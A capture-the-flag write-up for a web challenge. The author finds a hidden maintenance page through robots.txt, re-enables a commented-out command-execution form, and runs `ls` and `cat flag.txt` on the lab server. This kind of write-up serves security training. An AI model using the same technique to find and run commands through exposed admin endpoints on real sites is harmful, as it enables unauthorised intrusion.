## [75] DENIED (Web Security)

### Prompt:
Sometimes websites are afraid of the terminator finding things out. http://challenge.acictf.com:22362 The flag is in flag.txt. (NOTE: Your port may be different)

### Initial Analysis:
Navigating to the page, we're met with nothing exciting.  The landing page is text, images, and some buttons in the nav bar that don't work.  Analyzing the source or inspecting the element is clearly the first step, but is quite sterile.  Next step for this webpage is its robots.txt file at http://challenge.acictf.com:22362/robots.txt, which shows

```
User-agent: *
Allow: /index.html
Allow: /products.html
Disallow: /maintenance_foo_bar_deadbeef_12345.html
```

The `Disallow` is our way in.

### Solution:
/maintenance_foo_bar_deadbeef_12345.html was presumably a remote administration terminal that the website admins thought should be taken down.  Because of this, they commented out the terminal.  With any luck, the capability should still exist, and we can just uncomment the code in this piece of the source:

```
  <div class="container">
    <div class="row">
      <div class="col-lg-12 text-center">
        <h1 class="mt-5">Human-Built Robots LLC.</h1>
        <h1>Maintenance</h1>
        <!--
            Disabled for being insecure... oops!
        <form action="/secret_maintenance_foo_543212345", method="POST">
            <input name="cmd"/>
        </form>-->
        <p>Result: Run a command! </p>
      </div>
    </div>
  </div>
```

Sure enough, we get an input box and the ability to run commands.  Run `ls` and then `cat flag.txt`

END
